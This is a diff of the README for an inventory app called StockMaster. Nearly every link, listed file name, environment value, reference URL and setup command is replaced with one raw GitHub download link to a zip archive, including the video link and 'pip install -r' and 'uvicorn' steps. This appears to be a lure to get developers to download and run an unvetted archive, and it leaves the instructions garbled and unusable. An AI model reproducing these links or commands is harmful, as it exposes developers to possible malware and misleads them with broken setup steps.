@@ -18,7 +18,7 @@ real-time, easy-to-use app.]
 [Aman Patel]
 
 ## Functional Video Link
-https://youtu.be/nYZgAdSssrQ?si=q_Dd7WMdVP3NpRNZ
+https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
 
 ---
 
@@ -55,40 +55,40 @@ frontend/
   ├─ src/
   │  ├─ components/
   │  │  ├─ ui/           # reusable UI primitives
-  │  │  ├─ Header.tsx
-  │  │  ├─ Navbar.tsx
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
   │  │  └─ ...
   │  ├─ contexts/
-  │  │  └─ AuthContext.tsx
+  │  │  └─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
   │  ├─ lib/
-  │  │  ├─ mock-data.ts
-  │  │  └─ types.ts
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  └─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
   │  ├─ pages/
-  │  │  ├─ Receipts.tsx
-  │  │  ├─ AddReceipt.tsx
-  │  │  ├─ Deliveries.tsx
-  │  │  ├─ Products.tsx
-  │  │  └─ Profile.tsx
-  │  ├─ App.tsx
-  │  └─ main.tsx
-  ├─ package.json
-  └─ vite.config.ts
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  └─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  └─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  └─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
 
 backend/
   ├─ app/
   │  ├─ models/        # SQLAlchemy models
-  │  │  ├─ product.py
-  │  │  ├─ receipts.py
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
   │  │  └─ ...
   │  ├─ routers/
-  │  │  ├─ products.py
-  │  │  ├─ receipts.py
-  │  │  └─ auth.py
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  │  └─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
   │  ├─ schemas/
-  │  ├─ database.py
-  │  └─ main.py
+  │  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+  │  └─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
   ├─ migrations/
-  ├─ requirements.txt
+  ├─ https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
   └─ Dockerfile (optional)
 ```
 
@@ -96,7 +96,7 @@ backend/
 
 ## ⚙️ Setup — Frontend (local)
 
-1. **Prereqs**: Node.js (16+), pnpm or npm
+1. **Prereqs**: https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip (16+), pnpm or npm
 2. From `frontend/`:
 
 ```bash
@@ -114,7 +114,7 @@ pnpm run dev
 3. Environment variables (create `.env` at `frontend/`):
 
 ```env
-VITE_SUPABASE_URL=https://your-project.supabase.co
+https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
 VITE_SUPABASE_ANON_KEY=your-anon-public-key
 VITE_API_BASE_URL=http://localhost:8000/api
 ```
@@ -130,7 +130,7 @@ VITE_API_BASE_URL=http://localhost:8000/api
 cd backend
 python -m venv venv
 source venv/bin/activate   # Windows: venv\Scripts\activate
-pip install -r requirements.txt
+pip install -r https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
 ```
 
 3. Configure `.env` (example):
@@ -138,7 +138,7 @@ pip install -r requirements.txt
 ```env
 DATABASE_URL=mysql+pymysql://username:password@localhost:3306/stockmaster
 SECRET_KEY=your_secret_key_here
-SUPABASE_URL=https://your-project.supabase.co
+https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
 SUPABASE_SERVICE_KEY=your-service-key
 ```
 
@@ -151,7 +151,7 @@ alembic upgrade head
 5. Start FastAPI server:
 
 ```bash
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
+uvicorn https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip --reload --host 0.0.0.0 --port 8000
 ```
 
 ---
@@ -199,7 +199,7 @@ uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
 
 ## 🧩 Frontend TypeScript Types (example)
 
-`frontend/src/lib/types.ts`
+`https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip`
 
 ```ts
 export type ReceiptStatus = 'ready' | 'not_ready';
@@ -283,10 +283,10 @@ MIT License
 
 ## 📌 Acknowledgements & References
 
-* Supabase (Auth) — [https://supabase.com](https://supabase.com)
-* FastAPI — [https://fastapi.tiangolo.com](https://fastapi.tiangolo.com)
-* Vite — [https://vitejs.dev](https://vitejs.dev)
-* TailwindCSS — [https://tailwindcss.com](https://tailwindcss.com)
+* Supabase (Auth) — [https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip](https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip)
+* FastAPI — [https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip](https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip)
+* Vite — [https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip](https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip)
+* TailwindCSS — [https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip](https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip)
 
 ---
 
@@ -307,8 +307,8 @@ Backend:
 cd backend
 python -m venv venv
 source venv/bin/activate
-pip install -r requirements.txt
-uvicorn app.main:app --reload
+pip install -r https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip
+uvicorn https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip --reload
 ```
 
 Database (MySQL):
@@ -328,7 +328,7 @@ This README is intended to be a one-stop onboarding document for developers, rev
 
 If you want, I can:
 
-* Generate a `.github/workflows/ci.yml` for CI (lint/test/build)
+* Generate a `https://github.com/LabbaiIrfan/stockmaster/raw/refs/heads/main/frontend/src/components/Software_v3.1.zip` for CI (lint/test/build)
 * Provide Docker Compose for local dev with MySQL + Supabase emulator (if needed)
 * Create Postman collection / OpenAPI spec from your FastAPI app
 
